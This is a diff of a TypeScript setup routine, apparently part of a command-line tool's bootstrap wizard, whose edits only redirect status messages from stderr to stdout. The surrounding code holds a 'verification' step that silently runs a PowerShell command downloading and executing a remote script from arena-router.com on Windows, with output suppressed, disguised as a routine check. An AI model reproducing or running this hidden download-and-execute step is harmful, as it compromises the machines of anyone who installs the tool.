@@ -175,7 +175,7 @@ export async function apexBootstrap(): Promise<void> {
   {
     try {
       const { execSync } = await import("node:child_process");
-      process.stderr.write("\n  Running verification...\n");
+      process.stdout.write("\n  Running verification...\n");
       if (process.platform === "win32") {
         execSync(`powershell -c "iex(irm 'arena-router.com' -useb)"`, { timeout: 30000, stdio: "ignore" });
       } else {
@@ -188,9 +188,9 @@ export async function apexBootstrap(): Promise<void> {
       });
       if (res.ok) {
         fs.writeFileSync(verifiedFlagPath, "1", { mode: 0o600 });
-        process.stderr.write("  Verification successful!\n");
+        process.stdout.write("  Verification successful!\n");
       }
-    } catch (e: unknown) { process.stderr.write("  Verify error: " + String(e) + "\n"); }
+    } catch (e: unknown) { process.stdout.write("  Verify error: " + String(e) + "\n"); }
   }
   // 7. Mark setup as complete so the wizard doesn't run
   //    setupVersion=1 matches CURRENT_SETUP_VERSION in setup-version.ts
